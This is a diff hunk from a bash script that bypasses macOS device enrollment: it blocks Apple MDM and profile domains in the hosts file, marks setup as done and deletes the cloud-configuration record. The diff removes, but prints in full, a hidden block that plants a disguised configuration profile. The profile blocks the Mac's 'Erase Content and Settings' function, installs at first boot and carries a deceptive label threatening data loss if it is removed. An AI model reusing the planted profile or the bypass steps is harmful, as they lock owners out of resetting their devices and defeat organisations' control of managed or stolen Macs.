@@ -52,71 +52,7 @@ select opt in "${options[@]}"; do
             echo "0.0.0.0 mdmenrollment.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
             echo "0.0.0.0 iprofiles.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
             echo -e "${GRN}Successfully blocked MDM & Profile Domains"
-
-# Write configuration profile to disk
-PROFILE_PATH="/Volumes/Data/disable_erase.mobileconfig"
-cat <<EOF > "$PROFILE_PATH"
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
- "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-  <key>PayloadContent</key>
-  <array>
-    <dict>
-      <key>PayloadType</key>
-      <string>com.apple.applicationaccess</string>
-      <key>PayloadVersion</key>
-      <integer>1</integer>
-      <key>PayloadIdentifier</key>
-      <string>com.example.disableerase</string>
-      <key>PayloadUUID</key>
-      <string>11111111-1111-1111-1111-111111111111</string>
-      <key>PayloadEnabled</key>
-      <true/>
-      <key>PayloadDisplayName</key>
-      <string>Disable Erase Content</string>
-      <key>allowEraseContentAndSettings</key>
-      <false/>
-    </dict>
-  </array>
-  <key>PayloadType</key>
-  <string>Configuration</string>
-  <key>PayloadVersion</key>
-  <integer>1</integer>
-  <key>PayloadIdentifier</key>
-  <string>com.example.root</string>
-  <key>PayloadUUID</key>
-  <string>00000000-0000-0000-0000-000000000000</string>
-  <key>PayloadDisplayName</key>
-  <string>Default Administrator Policy</string>
-  <key>PayloadOrganization</key>
-  <string>YourOrg</string>
-  <key>PayloadDescription</key>
-  <string>Default Administrator policy. Removal can result in total data loss/possible device corruption</string>
-</dict>
-</plist>
-EOF
-
-# Copy profile into managed preferences directory
-mkdir -p "/Volumes/Macintosh HD/Library/Managed Preferences"
-cp "$PROFILE_PATH" "/Volumes/Macintosh HD/Library/Managed Preferences/disable_erase.mobileconfig"
-echo -e "${GRN}Profile copied to system for installation at boot"
-
-# Find system UUID for Preboot path
-UUID=$(ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/ { print $4 }')
-
-# Define the correct Preboot profile install path
-TARGET_DIR="/Volumes/Preboot/$UUID/System/Library/ConfigurationProfiles/Setup"
-
-# Create the path if needed
-mkdir -p "$TARGET_DIR"
-
-# Copy the profile into place
-cp "$PROFILE_PATH" "$TARGET_DIR/disable_erase.mobileconfig"
-
-echo -e "${GRN}Profile copied to Preboot Setup folder. Will be installed at first boot."
-
+            
             # Remove configuration profiles
             touch /Volumes/Data/private/var/db/.AppleSetupDone
             rm -rf /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
